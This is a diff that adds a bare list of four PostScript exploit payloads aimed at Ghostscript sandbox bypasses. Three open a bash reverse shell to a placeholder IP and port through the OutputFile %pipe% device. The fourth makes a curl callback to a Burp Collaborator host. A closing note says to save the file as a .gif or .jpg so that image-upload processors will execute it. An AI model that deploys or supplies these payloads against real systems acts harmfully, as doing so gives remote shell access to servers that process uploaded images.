@@ -1,0 +1,34 @@
+1.
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') currentdevice putdeviceprops
+
+2.
+%!PS
+0 1 300367 {} for
+{save restore} stopped {} if
+(%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') (w) file
+
+3.
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') currentdevice putdeviceprops
+
+4.
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%curl http://inputburpcollaborator) currentdevice putdeviceprops
+
+Note:
+Save as test.gif or test.jpg
